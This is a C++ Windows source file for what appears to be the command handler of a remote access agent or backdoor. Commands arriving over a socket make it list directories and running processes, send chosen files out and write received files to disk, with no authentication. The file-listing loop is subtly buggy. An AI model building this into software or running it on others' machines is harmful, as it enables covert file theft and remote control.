#include "BackStream.h"
#include <tlhelp32.h>




CBackStream::CBackStream(){

}


CBackStream::~CBackStream(){

}

void CBackStream::FillDirFiles(const char *spath){

	m_files.clear();

	char path[MAX_PATH];
	m_NowPath = spath;

	sprintf(path,"%s\\*.*",spath);

	WIN32_FIND_DATAA wfd;
	HANDLE hSearch = NULL;

	hSearch = FindFirstFileA(path,&wfd);

	if(hSearch == INVALID_HANDLE_VALUE)	{
		Error("FindFirstFile Error");
		return;
	}

	bool bResult = true;
	TFiles file;
	while(bResult){
		
		bResult = FindNextFileA(hSearch,&wfd);

		if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)		file.IsFile = false;
		else													file.IsFile = true;		
			
		file.files = wfd.cFileName;
		file.filesize = wfd.nFileSizeLow;
			
		m_files.push_back(file);
	}
}

void CBackStream::Error(const char *mes){

		MessageBoxA(NULL,mes,"error",0);

}


void CBackStream::GetDirListPacket(){

	Files::iterator it;


	m_PacketString.clear();

	char buf[MAX_PATH];

	m_PacketString += m_NowPath;
	m_PacketString += "\n";

	for(it = m_files.begin(); it != m_files.end(); it++){
		
		if( (*it).IsFile  )
		{
			m_PacketString += (*it).files;
			m_PacketString += ':';
		}
		else
		{
			m_PacketString += '[';		
			m_PacketString += (*it).files;
			m_PacketString += "]:";		
		}
		
		//m_PacketString += ( (*it).IsFile )? "F\n":"D\n";

		sprintf(buf,"%d\n",(*it).filesize);

		m_PacketString += buf;
		
	}
}

void CBackStream::GetProcessListPacket(){

	Process::iterator it;

	m_PacketString.clear();

	for(it=m_process.begin(); it!=m_process.end(); it++){
		
		m_PacketString += (*it).process;
		m_PacketString += '\n';
	}

}

void CBackStream::FillProcessList(){

	m_process.clear();

	HANDLE hSnap;

	PROCESSENTRY32 pe;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	if(hSnap == INVALID_HANDLE_VALUE)	Error("CreateToolhelp32Snapshot Error\n");

	pe.dwSize = sizeof(pe);

	bool bResult = true;
	TProcess data;

	bResult = Process32First(hSnap,&pe);

	char buf[MAX_PATH];

	if(bResult){
	

		do{

			WideCharToMultiByte(CP_ACP,0,pe.szExeFile,-1,buf,MAX_PATH,NULL,NULL);
			data.process = buf;
			m_process.push_back(data);

			bResult = Process32Next(hSnap,&pe);

		}while(bResult);

		
	}
	

	CloseHandle(hSnap);

}

bool CBackStream::GetCmdArg(WORD &cmd, std::string & arg){
	
	if( m_CSock.m_buf[0] != '*')	return false;
	

	memcpy(&cmd,&m_CSock.m_buf[1],2);

	arg = &m_CSock.m_buf[3];
	
	
	return true;
}

void CBackStream::SendPacket(WORD type){
	

	if(type != FILE_SEND && type != FILE_RECV )
		m_CSock.SendPacket(m_PacketString);

}

void CBackStream::SendFile(const char *sFile){

	m_CSock.SendFile(sFile);

}


void CBackStream::RecvFile(const char *sFile){

	m_CSock.RecvFile(sFile);
}

void CBackStream::CmdProcess()
{
	WORD cmd = 0;
	std::string scmd = "";

	GetCmdArg(cmd,scmd);

	switch(cmd){ 

		case DIRLIST:
			FillDirFiles(scmd.c_str());
			GetDirListPacket();
			SendPacket(cmd);
			break;

		case PROCESS_LIST:
			FillProcessList();
			GetProcessListPacket();
			SendPacket(cmd);
			break;

		case FILE_SEND:
			SendFile(scmd.c_str());
			break;

		case FILE_RECV:
			RecvFile(scmd.c_str());
			
			break;

	}

}